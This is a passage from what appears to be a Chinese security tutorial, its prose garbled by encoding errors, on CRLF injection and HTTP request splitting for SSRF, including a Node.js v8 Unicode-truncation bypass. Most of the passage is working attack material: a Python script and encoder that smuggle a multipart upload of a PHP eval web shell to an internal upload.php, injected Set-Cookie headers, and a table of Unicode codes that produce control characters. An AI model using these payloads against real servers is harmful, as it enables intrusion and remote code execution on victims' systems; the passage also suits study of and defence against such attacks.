<p>ç„¶åæ„é€ è¯·æ±‚ï¼š</p>
<pre><code class="highlight python"><span class="comment">#!python</span>
<span class="comment">#!/usr/bin/env python3</span>
<span class="keyword">import</span> urllib
<span class="keyword">import</span> urllib.request
<span class="keyword">import</span> urllib.error

<span class="comment"># url = &quot;http://47.101.57.72:4000</span>
url = <span class="string">&#x27;http://47.101.57.72:4000?a=1 HTTP/1.1\r\n\r\nPOST /upload.php HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Length: 435\r\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryjDb9HMGTixAA7Am6\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: zh-CN,zh;q=0.9\r\nCookie: PHPSESSID=nk67astv61hqanskkddslkgst4\r\nConnection: close\r\n\r\n------WebKitFormBoundaryjDb9HMGTixAA7Am6\r\nContent-Disposition: form-data; name=&quot;MAX_FILE_SIZE&quot;\r\n\r\n100000\r\n------WebKitFormBoundaryjDb9HMGTixAA7Am6\r\nContent-Disposition: form-data; name=&quot;uploaded&quot;; filename=&quot;shell.php&quot;\r\nContent-Type: application/octet-stream\r\n\r\n&lt;?php eval($_POST[whoami]);?&gt;\r\n------WebKitFormBoundaryjDb9HMGTixAA7Am6\r\nContent-Disposition: form-data; name=&quot;Upload&quot;\r\n\r\nUpload\r\n------WebKitFormBoundaryjDb9HMGTixAA7Am6--\r\n\r\nGET / HTTP/1.1\r\ntest:&#x27;</span>
<span class="comment"># ?a=1 åé¢çš„é‚£ä¸ªHTTP/1.1æ˜¯ä¸ºäº†é—­åˆæ­£å¸¸çš„HTTPçŠ¶æ€è¡Œ</span>
<span class="keyword">try</span>:
    info = urllib.request.urlopen(url).info()
    <span class="built_in">print</span>(info)

<span class="keyword">except</span> urllib.error.URLError <span class="keyword">as</span> e:
    <span class="built_in">print</span>(e)</code></pre>

<p><img src="https://p5.ssl.qhimg.com/t014cac7ba1ff8544a8.png" alt="img"></p>
<p>å¦‚ä¸Šå›¾æ‰€ç¤ºï¼ŒæˆåŠŸæ„é€ å‡ºäº†ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„POSTè¯·æ±‚ï¼Œåƒè¿™æ ·çš„POSTè¯·æ±‚å¯ä»¥è¢«æˆ‘ä»¬ç”¨äº SSRFã€‚ä¸‹é¢æˆ‘ä»¬åˆ†æä¸€ä¸‹æ•´ä¸ªæ”»å‡»çš„è¿‡ç¨‹ã€‚</p>
<p>åŸå§‹è¯·æ±‚æ•°æ®å¦‚ä¸‹ï¼š</p>
<pre><code class="highlight http"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span>
<span class="attribute">Host</span><span class="punctuation">: </span>47.101.57.72:4000</code></pre>

<p>å½“æˆ‘ä»¬æ’å…¥CRLFæ•°æ®åï¼ŒHTTPè¯·æ±‚æ•°æ®å˜æˆäº†ï¼š</p>
<pre><code class="highlight http"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span>

<span class="language-php">POST /upload.php HTTP/<span class="number">1.1</span></span>
<span class="language-php">Host: <span class="number">127.0</span>.<span class="number">0.1</span></span>
<span class="language-php">Content-Length: <span class="number">437</span></span>
<span class="language-php">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjDb9HMGTixAA7Am6</span>
<span class="language-php">......</span>
<span class="language-php"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;whoami&quot;</span>]);<span class="meta">?&gt;</span></span>
<span class="language-php">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span>
<span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;Upload&quot;</span></span>
<span class="language-php"></span>
<span class="language-php">Upload</span>
<span class="language-php">------WebKitFormBoundaryjDb9HMGTixAA7Am6--</span>
<span class="language-php"></span>
<span class="language-php"> HTTP/<span class="number">1.1</span></span>
<span class="language-php">Host: <span class="number">47.101</span>.<span class="number">57.72</span>:<span class="number">4000</span></span></code></pre>

<p>ä¸Šæ¬¡è¯·æ±‚åŒ…çš„Hostå­—æ®µå’ŒçŠ¶æ€è¡Œä¸­çš„ <code>HTTP/1.1</code> å°±å•ç‹¬å‡ºæ¥äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬å†æ„é€ ä¸€ä¸ªè¯·æ±‚æŠŠä»–é—­åˆï¼š</p>
<pre><code class="highlight http"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span>

<span class="language-php">POST /upload.php HTTP/<span class="number">1.1</span></span>
<span class="language-php">Host: <span class="number">127.0</span>.<span class="number">0.1</span></span>
<span class="language-php">Content-Length: <span class="number">437</span></span>
<span class="language-php">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjDb9HMGTixAA7Am6</span>
<span class="language-php">......</span>
<span class="language-php"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;whoami&quot;</span>]);<span class="meta">?&gt;</span></span>
<span class="language-php">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span>
<span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;Upload&quot;</span></span>
<span class="language-php"></span>
<span class="language-php">Upload</span>
<span class="language-php">------WebKitFormBoundaryjDb9HMGTixAA7Am6--</span>
<span class="language-php"></span>
<span class="language-php">GET / HTTP/<span class="number">1.1</span></span>
<span class="language-php">test: HTTP/<span class="number">1.1</span></span>
<span class="language-php">Host: <span class="number">47.101</span>.<span class="number">57.72</span>:<span class="number">4000</span></span></code></pre>

<h2 id="NodeJS-ä¸­çš„-CRLF-Injection"><a href="#NodeJS-ä¸­çš„-CRLF-Injection" class="headerlink" title="NodeJS ä¸­çš„ CRLF Injection"></a>NodeJS ä¸­çš„ CRLF Injection</h2><h3 id="HTTP-è¯·æ±‚è·¯å¾„ä¸­çš„-Unicode-å­—ç¬¦æŸå"><a href="#HTTP-è¯·æ±‚è·¯å¾„ä¸­çš„-Unicode-å­—ç¬¦æŸå" class="headerlink" title="HTTP è¯·æ±‚è·¯å¾„ä¸­çš„ Unicode å­—ç¬¦æŸå"></a>HTTP è¯·æ±‚è·¯å¾„ä¸­çš„ Unicode å­—ç¬¦æŸå</h3><p>è™½ç„¶ç”¨æˆ·å‘å‡ºçš„ HTTP è¯·æ±‚é€šå¸¸å°†è¯·æ±‚è·¯å¾„æŒ‡å®šä¸ºå­—ç¬¦ä¸²ï¼Œä½†Node.jsæœ€ç»ˆå¿…é¡»å°†è¯·æ±‚ä½œä¸ºåŸå§‹å­—èŠ‚è¾“å‡ºã€‚JavaScriptæ”¯æŒunicodeå­—ç¬¦ä¸²ï¼Œå› æ­¤å°†å®ƒä»¬è½¬æ¢ä¸ºå­—èŠ‚æ„å‘³ç€é€‰æ‹©å¹¶åº”ç”¨é€‚å½“çš„Unicodeç¼–ç ã€‚å¯¹äºä¸åŒ…å«ä¸»ä½“çš„è¯·æ±‚ï¼ŒNode.jsé»˜è®¤ä½¿ç”¨â€œlatin1â€ï¼Œè¿™æ˜¯ä¸€ç§å•å­—èŠ‚ç¼–ç å­—ç¬¦é›†ï¼Œä¸èƒ½è¡¨ç¤ºé«˜ç¼–å·çš„Unicodeå­—ç¬¦ï¼Œä¾‹å¦‚ğŸ¶è¿™ä¸ªè¡¨æƒ…ã€‚æ‰€ä»¥ï¼Œå½“æˆ‘ä»¬çš„è¯·æ±‚è·¯å¾„ä¸­å«æœ‰å¤šå­—èŠ‚ç¼–ç çš„Unicodeå­—ç¬¦æ—¶ï¼Œä¼šè¢«æˆªæ–­å–æœ€ä½å­—èŠ‚ï¼Œæ¯”å¦‚ <code>\u0130</code> å°±ä¼šè¢«æˆªæ–­ä¸º <code>\u30</code>ï¼š</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250714174138058.png" alt="image-20250714174138058"></p>
<h3 id="Unicode-å­—ç¬¦æŸåé€ æˆçš„-HTTP-æ‹†åˆ†æ”»å‡»"><a href="#Unicode-å­—ç¬¦æŸåé€ æˆçš„-HTTP-æ‹†åˆ†æ”»å‡»" class="headerlink" title="Unicode å­—ç¬¦æŸåé€ æˆçš„ HTTP æ‹†åˆ†æ”»å‡»"></a>Unicode å­—ç¬¦æŸåé€ æˆçš„ HTTP æ‹†åˆ†æ”»å‡»</h3><p>åˆšæ‰æ¼”ç¤ºçš„é‚£ä¸ª HTTP è¯·æ±‚è·¯å¾„ä¸­çš„ Unicode å­—ç¬¦æŸåçœ‹ä¼¼æ²¡æœ‰ä»€ä¹ˆç”¨å¤„ï¼Œä½†å®ƒå¯ä»¥åœ¨ nodejs çš„ HTTP æ‹†åˆ†æ”»å‡»ä¸­å¤§æ˜¾èº«æ‰‹ã€‚</p>
<p>ç”±äºnodejsçš„HTTPåº“åŒ…å«äº†é˜»æ­¢CRLFçš„æªæ–½ï¼Œå³å¦‚æœä½ å°è¯•å‘å‡ºä¸€ä¸ªURLè·¯å¾„ä¸­å«æœ‰å›è½¦ã€æ¢è¡Œæˆ–ç©ºæ ¼ç­‰æ§åˆ¶å­—ç¬¦çš„HTTPè¯·æ±‚æ˜¯ï¼Œå®ƒä»¬ä¼šè¢«URLç¼–ç (ä½†æ˜¯<code>\r\n</code>å®é™…åœ¨æˆ‘çš„ç‰ˆæœ¬ä¸­ä¼šè¢«ç›´æ¥å±è”½æ‰)ï¼Œæ‰€ä»¥æ­£å¸¸çš„CRLFæ³¨å…¥åœ¨nodejsä¸­å¹¶ä¸èƒ½åˆ©ç”¨ï¼š</p>
<pre><code class="highlight plaintext">GET /%20/whoami HTTP/1.1  #åŸå§‹è¯·æ±‚é‡Œæ˜¯ç©ºæ ¼
Host: 47.111.141.135:9999
Connection: keep-alive

GET //whoami HTTP/1.1 #åŸå§‹è¯·æ±‚ä¸º\r\n
Host: 47.111.141.135:9999
Connection: keep-alive</code></pre>

<p>ä½†ä¸å¹¸çš„æ˜¯ï¼Œä¸Šè¿°çš„å¤„ç†Unicodeå­—ç¬¦é”™è¯¯æ„å‘³ç€å¯ä»¥è§„é¿è¿™äº›ä¿æŠ¤æªæ–½ã€‚è€ƒè™‘å¦‚ä¸‹çš„URLï¼Œå…¶ä¸­åŒ…å«ä¸€äº›é«˜ç¼–å·çš„Unicodeå­—ç¬¦ï¼š</p>
<pre><code class="highlight plaintext">&gt; &#x27;http://47.101.57.72:4000/\u&#123;010D&#125;\u&#123;010A&#125;/WHOAMI&#x27;</code></pre>

<p>é«˜ç‰ˆæœ¬çš„æŠ¥æ–‡</p>
<pre><code class="highlight plaintext">GET /%C4%8D%C4%8A/WHOAMI HTTP/1.1
Host: 47.111.141.135:9999
Connection: keep-alive</code></pre>

<p>å½“ Node.js v8 æˆ–æ›´ä½ç‰ˆæœ¬å¯¹æ­¤URLå‘å‡º <code>GET</code> è¯·æ±‚æ—¶ï¼Œå®ƒä¸ä¼šè¿›è¡Œç¼–ç è½¬ä¹‰ï¼Œå› ä¸ºå®ƒä»¬ä¸æ˜¯HTTPæ§åˆ¶å­—ç¬¦ï¼š</p>
<pre><code class="highlight js">&gt; http.<span class="title function_">get</span>(<span class="string">&#x27;http://47.111.141.135:9999/\u010D\u010A/WHOAMI&#x27;</span>).<span class="property">output</span>
[ <span class="string">&#x27;GET /ÄÄŠ/WHOAMI HTTP/1.1\r\nHost: 47.111.141.135:9999\r\nConnection: close\r\n\r\n&#x27;</span> ]</code></pre>

<p>ä½†æ˜¯å½“ç»“æœå­—ç¬¦ä¸²è¢«ç¼–ç ä¸º latin1 å†™å…¥è·¯å¾„æ—¶ï¼Œè¿™äº›å­—ç¬¦å°†åˆ†åˆ«è¢«æˆªæ–­ä¸º â€œ\râ€ï¼ˆ%0dï¼‰å’Œ â€œ\nâ€ï¼ˆ%0aï¼‰ï¼š</p>
<p><img src="https://p4.ssl.qhimg.com/t01820e6d889f5f8892.png" alt="img"></p>
<p>ä½†æ˜¯è¿™åœ¨æˆ‘çš„ç‰ˆæœ¬ä¸­å·²ç»æ²¡æœ‰äº†ï¼Œæ— è®ºæ˜¯<code>\u&#123;010D&#125;\u&#123;010A&#125;</code>è¿˜æ˜¯<code>\u010D\u010A</code>åœ¨HTTPè¯·æ±‚ä¸­éƒ½ä¼šè¢«è§£ç </p>
<p>è€Œåœ¨</p>
<pre><code class="highlight plaintext">Buffer.from(&#x27;http://47.111.141.135:9999/\u&#123;010D&#125;\u&#123;010A&#125;/WHOAMI&#x27;, &#x27;latin1&#x27;).toString()</code></pre>

<p>æ˜¯å¯ä»¥è¢«è½¬ä¹‰å‡ºæ¥çš„</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250714181611956.png" alt="image-20250714181611956"></p>
<p>ç›®å‰åŸå› æœªçŸ¥å•Šã€‚ã€‚æ„Ÿè§‰æ˜¯è¿™ä¸ªå·²ç»åœ¨é«˜ç‰ˆæœ¬ä¸­è¢«ä¿®å¤äº†ï¼Œè¢«httpåˆ¶è£äº†ã€‚ã€‚</p>
<p>é‚£ä¹ˆå°±è¦æ”¶é›†ä¸€ä¸‹è¿™ä¸ª<strong>æœ€åé€‚ç”¨çš„ç‰ˆæœ¬</strong>äº†(å›å¤´å†æ‰¾å§æˆ‘æ˜¯æ‡’ç‹—ã€‚ã€‚)ï¼Œä½†æ˜¯è¿˜æ˜¯è®°å½•ä¸€ä¸‹è¿™äº›å¤æ—©ç‰ˆæœ¬çš„ç¥å¿…æ¼æ´å§<del>å…«æ—¬æ¼æ´ä¼šé‡åˆ°ç™½å‘æœºå­å—</del></p>
<p>å¯è§ï¼Œé€šè¿‡åœ¨è¯·æ±‚è·¯å¾„ä¸­åŒ…å«ç²¾å¿ƒé€‰æ‹©çš„Unicodeå­—ç¬¦ï¼Œæ”»å‡»è€…å¯ä»¥æ¬ºéª—Node.jså¹¶æˆåŠŸå®ç°CRLFæ³¨å…¥ã€‚</p>
<p>ä¸ä»…æ˜¯CRLFï¼Œæ‰€æœ‰çš„æ§åˆ¶å­—ç¬¦éƒ½å¯ä»¥é€šè¿‡è¿™ä¸ªæ„é€ å‡ºæ¥ã€‚ä¸‹é¢æ˜¯æˆ‘åˆ—ä¸¾å‡ºæ¥çš„è¡¨æ ¼ï¼Œç¬¬ä¸€åˆ—æ˜¯éœ€è¦æ„é€ çš„å­—ç¬¦ï¼Œç¬¬äºŒåˆ—æ˜¯å¯æ„é€ å‡ºç›¸åº”å­—ç¬¦çš„é«˜ç¼–å·çš„Unicodeç ï¼Œç¬¬ä¸‰åˆ—æ˜¯é«˜ç¼–å·çš„Unicodeç å¯¹åº”çš„å­—ç¬¦ï¼Œç¬¬å››åˆ—æ˜¯é«˜ç¼–å·çš„Unicodeç å¯¹åº”çš„å­—ç¬¦çš„URLç¼–ç ï¼š</p>
<table>
<thead>
<tr>
<th align="center">å­—ç¬¦</th>
<th align="center">å¯ç”±ä»¥ä¸‹Unicodeç¼–ç æ„é€ å‡º</th>
<th align="center">Unicodeç¼–ç å¯¹åº”çš„å­—ç¬¦</th>
<th align="center">Unicodeç¼–ç å¯¹åº”çš„å­—ç¬¦å¯¹åº”çš„URLç¼–ç </th>
</tr>
</thead>
<tbody><tr>
<td align="center">å›è½¦ç¬¦ \r</td>
<td align="center">\u010d</td>
<td align="center">Ä</td>
<td align="center">%C4%8D</td>
</tr>
<tr>
<td align="center">æ¢è¡Œç¬¦ \n</td>
<td align="center">\u010a</td>
<td align="center">ÄŠ</td>
<td align="center">%C4%8A</td>
</tr>
<tr>
<td align="center">ç©ºæ ¼</td>
<td align="center">\u0120</td>
<td align="center">Ä </td>
<td align="center">%C4%A0</td>
</tr>
<tr>
<td align="center">åæ–œæ  \</td>
<td align="center">\u0122</td>
<td align="center">Ä¢</td>
<td align="center">%C4%A2</td>
</tr>
<tr>
<td align="center">å•å¼•å· â€˜</td>
<td align="center">\u0127</td>
<td align="center">Ä§</td>
<td align="center">%C4%A7</td>
</tr>
<tr>
<td align="center">åå¼•å· &#96;</td>
<td align="center">\u0160</td>
<td align="center">Å </td>
<td align="center">%C5%A0</td>
</tr>
<tr>
<td align="center">å¹å· !</td>
<td align="center">\u0121</td>
<td align="center">Ä¡</td>
<td align="center">%C4%A1</td>
</tr>
</tbody></table>
<p>è¿™ä¸ªbugå·²ç»åœ¨Node.js10ä¸­è¢«ä¿®å¤ï¼Œå¦‚æœè¯·æ±‚è·¯å¾„åŒ…å«éAsciiå­—ç¬¦ï¼Œåˆ™ä¼šæŠ›å‡ºé”™è¯¯ã€‚ä½†æ˜¯å¯¹äº Node.js v8 æˆ–æ›´ä½ç‰ˆæœ¬ï¼Œå¦‚æœæœ‰ä¸‹åˆ—æƒ…å†µï¼Œä»»ä½•å‘å‡ºHTTPè¯·æ±‚çš„æœåŠ¡å™¨éƒ½å¯èƒ½å—åˆ°é€šè¿‡è¯·æ±‚æ‹†å®ç°çš„SSRFçš„æ”»å‡»ï¼š</p>
<ul>
<li>æ¥å—æ¥è‡ªç”¨æˆ·è¾“å…¥çš„Unicodeæ•°æ®</li>
<li>å¹¶å°†å…¶åŒ…å«åœ¨HTTPè¯·æ±‚çš„è·¯å¾„ä¸­</li>
<li>ä¸”è¯·æ±‚å…·æœ‰ä¸€ä¸ª0é•¿åº¦çš„ä¸»ä½“ï¼ˆæ¯”å¦‚ä¸€ä¸ª <code>GET</code> æˆ–è€… <code>DELETE</code>)</li>
</ul>
<h3 id="åœ¨-HTTP-çŠ¶æ€è¡Œæ³¨å…¥æ¶æ„é¦–éƒ¨å­—æ®µ-1"><a href="#åœ¨-HTTP-çŠ¶æ€è¡Œæ³¨å…¥æ¶æ„é¦–éƒ¨å­—æ®µ-1" class="headerlink" title="åœ¨ HTTP çŠ¶æ€è¡Œæ³¨å…¥æ¶æ„é¦–éƒ¨å­—æ®µ"></a>åœ¨ HTTP çŠ¶æ€è¡Œæ³¨å…¥æ¶æ„é¦–éƒ¨å­—æ®µ</h3><p>ç”±äº NodeJS çš„è¿™ä¸ª CRLF æ³¨å…¥ç‚¹åœ¨ HTTP çŠ¶æ€è¡Œï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬è¦æ³¨å…¥æ¶æ„çš„ HTTP é¦–éƒ¨å­—æ®µçš„è¯è¿˜éœ€è¦é—­åˆçŠ¶æ€è¡Œä¸­ <code>HTTP/1.1</code> ï¼Œå³ä¿è¯æ³¨å…¥åæœ‰æ­£å¸¸çš„ HTTP çŠ¶æ€è¡Œï¼š</p>
<pre><code class="highlight js">&gt; http.<span class="title function_">get</span>(<span class="string">&#x27;http://47.101.57.72:4000/\u0120HTTP/1.1\u010D\u010ASet-Cookie:\u0120PHPSESSID=whoami&#x27;</span>).<span class="property">output</span>
[ <span class="string">&#x27;GET /Ä HTTP/1.1ÄÄŠSet-Cookie:Ä PHPSESSID=whoami HTTP/1.1\r\nHost: 47.101.57.72:4000\r\nConnection: close\r\n\r\n&#x27;</span> ]</code></pre>

<p><img src="https://p4.ssl.qhimg.com/t01833dd0e566e383b1.png" alt="img"></p>
<p>å¦‚ä¸Šå›¾æ‰€ç¤ºï¼ŒæˆåŠŸæ„é€ å‡ºäº†ä¸€ä¸ª Set-Cookie é¦–éƒ¨å­—æ®µï¼Œè™½ç„¶åé¢è¿˜æœ‰ä¸€ä¸ª <code>HTTP/1.1</code> ï¼Œä½†æˆ‘ä»¬æ ¹æ®è¯¥åŸç†ä¾ç„¶å¯ä»¥å°†å…¶é—­åˆï¼š</p>
<pre><code class="highlight js">&gt; http.<span class="title function_">get</span>(<span class="string">&#x27;http://47.101.57.72:4000/\u0120HTTP/1.1\u010D\u010ASet-Cookie:\u0120PHPSESSID=whoami\u010D\u010Atest:&#x27;</span>).<span class="property">output</span>
[ <span class="string">&#x27;GET /Ä HTTP/1.1ÄÄŠSet-Cookie:Ä PHPSESSID=whoamiÄÄŠtest: HTTP/1.1\r\nHost: 47.101.57.72:4000\r\nConnection: close\r\n\r\n&#x27;</span> ]</code></pre>

<p><img src="https://p5.ssl.qhimg.com/t0196c013fcb593f5dc.png" alt="img"></p>
<p>è¿™æ ·ï¼Œæˆ‘ä»¬ä¾¿å¯ä»¥æ„é€  â€œä»»æ„â€ çš„HTTPè¯·æ±‚äº†ã€‚</p>
<h3 id="åœ¨-HTTP-çŠ¶æ€è¡Œæ³¨å…¥å®Œæ•´-HTTP-è¯·æ±‚-1"><a href="#åœ¨-HTTP-çŠ¶æ€è¡Œæ³¨å…¥å®Œæ•´-HTTP-è¯·æ±‚-1" class="headerlink" title="åœ¨ HTTP çŠ¶æ€è¡Œæ³¨å…¥å®Œæ•´ HTTP è¯·æ±‚"></a>åœ¨ HTTP çŠ¶æ€è¡Œæ³¨å…¥å®Œæ•´ HTTP è¯·æ±‚</h3><p>é¦–å…ˆï¼Œç”±äº NodeJS çš„è¿™ä¸ª CRLF æ³¨å…¥ç‚¹åœ¨ HTTP çŠ¶æ€è¡Œï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬è¦æ³¨å…¥å®Œæ•´çš„ HTTP è¯·æ±‚çš„è¯éœ€è¦å…ˆé—­åˆçŠ¶æ€è¡Œä¸­ <code>HTTP/1.1</code> ï¼Œå³ä¿è¯æ³¨å…¥åæœ‰æ­£å¸¸çš„ HTTP çŠ¶æ€è¡Œã€‚å…¶æ¬¡ä¸ºäº†ä¸è®©åŸæ¥çš„ <code>HTTP/1.1</code> å½±å“æˆ‘ä»¬æ–°æ„é€ çš„è¯·æ±‚ï¼Œæˆ‘ä»¬è¿˜éœ€è¦å†æ„é€ ä¸€æ¬¡ <code>GET /</code> é—­åˆåŸæ¥çš„ HTTP è¯·æ±‚ã€‚</p>
<p>å‡è®¾ç›®æ ‡ä¸»æœºå­˜åœ¨SSRFï¼Œéœ€è¦æˆ‘ä»¬åœ¨ç›®æ ‡ä¸»æœºæœ¬åœ°ä¸Šä¼ æ–‡ä»¶ã€‚æˆ‘ä»¬éœ€è¦å°è¯•æ„é€ å¦‚ä¸‹è¿™ä¸ªæ–‡ä»¶ä¸Šä¼ çš„å®Œæ•´ POST è¯·æ±‚ï¼š</p>
<pre><code class="highlight http"><span class="keyword">POST</span> <span class="string">/upload.php</span> <span class="meta">HTTP/1.1</span>
<span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1
<span class="attribute">Content-Length</span><span class="punctuation">: </span>437
<span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryjDb9HMGTixAA7Am6
<span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36
<span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
<span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate
<span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9
<span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=nk67astv61hqanskkddslkgst4
<span class="attribute">Connection</span><span class="punctuation">: </span>close

<span class="language-php">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span>
<span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;MAX_FILE_SIZE&quot;</span></span>
<span class="language-php"></span>
<span class="language-php"><span class="number">100000</span></span>
<span class="language-php">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span>
<span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;uploaded&quot;</span>; filename=<span class="string">&quot;shell.php&quot;</span></span>
<span class="language-php">Content-Type: application/octet-stream</span>
<span class="language-php"></span>
<span class="language-php"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;whoami&quot;</span>]);<span class="meta">?&gt;</span></span>
<span class="language-php">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span>
<span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;Upload&quot;</span></span>
<span class="language-php"></span>
<span class="language-php">Upload</span>
<span class="language-php">------WebKitFormBoundaryjDb9HMGTixAA7Am6--</span></code></pre>

<p>ä¸ºäº†æ–¹ä¾¿ï¼Œæˆ‘ä»¬å°†è¿™ä¸ªPOSTè¯·æ±‚é‡Œé¢çš„æ‰€æœ‰çš„å­—ç¬¦åŒ…æ‹¬æ§åˆ¶ç¬¦å…¨éƒ¨ç”¨ä¸Šè¿°çš„é«˜ç¼–å·Unicodeç è¡¨ç¤ºï¼š</p>
<pre><code class="highlight python">payload = <span class="string">&#x27;&#x27;&#x27; HTTP/1.1</span>
<span class="string"></span>
<span class="string">POST /upload.php HTTP/1.1</span>
<span class="string">Host: 127.0.0.1</span>
<span class="string">Content-Length: 437</span>
<span class="string">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjDb9HMGTixAA7Am6</span>
<span class="string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36</span>
<span class="string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span>
<span class="string">Accept-Encoding: gzip, deflate</span>
<span class="string">Accept-Language: zh-CN,zh;q=0.9</span>
<span class="string">Cookie: PHPSESSID=nk67astv61hqanskkddslkgst4</span>
<span class="string">Connection: close</span>
<span class="string"></span>
<span class="string">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span>
<span class="string">Content-Disposition: form-data; name=&quot;MAX_FILE_SIZE&quot;</span>
<span class="string"></span>
<span class="string">100000</span>
<span class="string">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span>
<span class="string">Content-Disposition: form-data; name=&quot;uploaded&quot;; filename=&quot;shell.php&quot;</span>
<span class="string">Content-Type: application/octet-stream</span>
<span class="string"></span>
<span class="string">&lt;?php eval($_POST[&quot;whoami&quot;]);?&gt;</span>
<span class="string">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span>
<span class="string">Content-Disposition: form-data; name=&quot;Upload&quot;</span>
<span class="string"></span>
<span class="string">Upload</span>
<span class="string">------WebKitFormBoundaryjDb9HMGTixAA7Am6--</span>
<span class="string"></span>
<span class="string">GET / HTTP/1.1</span>
<span class="string">test:&#x27;&#x27;&#x27;</span>.replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;\r\n&quot;</span>)

<span class="keyword">def</span> <span class="title function_">payload_encode</span>(<span class="params">raw</span>):
    ret = <span class="string">u&quot;&quot;</span>
    <span class="keyword">for</span> i <span class="keyword">in</span> raw:
        ret += <span class="built_in">chr</span>(<span class="number">0x0100</span>+<span class="built_in">ord</span>(i))
    <span class="keyword">return</span> ret

payload = payload_encode(payload)
<span class="built_in">print</span>(payload)

<span class="comment"># è¾“å‡º: Ä ÅˆÅ”Å”ÅÄ¯Ä±Ä®Ä±ÄÄŠÄÄŠÅÅÅ“Å”Ä Ä¯ÅµÅ°Å¬Å¯Å¡Å¤Ä®Å°Å¨Å°Ä ÅˆÅ”Å”ÅÄ¯Ä±Ä®Ä±ÄÄŠÅˆÅ¯Å³Å´ÄºÄ Ä±Ä²Ä·Ä®Ä°Ä®Ä°Ä®Ä±ÄÄŠÅƒÅ¯Å®Å´Å¥Å®Å´Ä­ÅŒÅ¥Å®Å§Å´Å¨ÄºÄ Ä´Ä³Ä·ÄÄŠÅƒÅ¯Å®Å´Å¥Å®Å´Ä­Å”Å¹Å°Å¥ÄºÄ Å­ÅµÅ¬Å´Å©Å°Å¡Å²Å´Ä¯Å¦Å¯Å²Å­Ä­Å¤Å¡Å´Å¡Ä»Ä Å¢Å¯ÅµÅ®Å¤Å¡Å²Å¹Ä½Ä­Ä­Ä­Ä­Å—Å¥Å¢Å‹Å©Å´Å†Å¯Å²Å­Å‚Å¯ÅµÅ®Å¤Å¡Å²Å¹ÅªÅ„Å¢Ä¹ÅˆÅÅ‡Å”Å©Å¸ÅÅÄ·ÅÅ­Ä¶ÄÄŠÅ•Å³Å¥Å²Ä­ÅÅ§Å¥Å®Å´ÄºÄ ÅÅ¯ÅºÅ©Å¬Å¬Å¡Ä¯ÄµÄ®Ä°Ä Ä¨Å—Å©Å®Å¤Å¯Å·Å³Ä ÅÅ”Ä Ä±Ä°Ä®Ä°Ä»Ä Å—Å©Å®Ä¶Ä´Ä»Ä Å¸Ä¶Ä´Ä©Ä ÅÅ°Å°Å¬Å¥Å—Å¥Å¢Å‹Å©Å´Ä¯ÄµÄ³Ä·Ä®Ä³Ä¶Ä Ä¨Å‹ÅˆÅ”ÅÅŒÄ¬Ä Å¬Å©Å«Å¥Ä Å‡Å¥Å£Å«Å¯Ä©Ä ÅƒÅ¨Å²Å¯Å­Å¥Ä¯Ä¹Ä°Ä®Ä°Ä®Ä´Ä´Ä³Ä°Ä®Ä·Ä²Ä Å“Å¡Å¦Å¡Å²Å©Ä¯ÄµÄ³Ä·Ä®Ä³Ä¶ÄÄŠÅÅ£Å£Å¥Å°Å´ÄºÄ 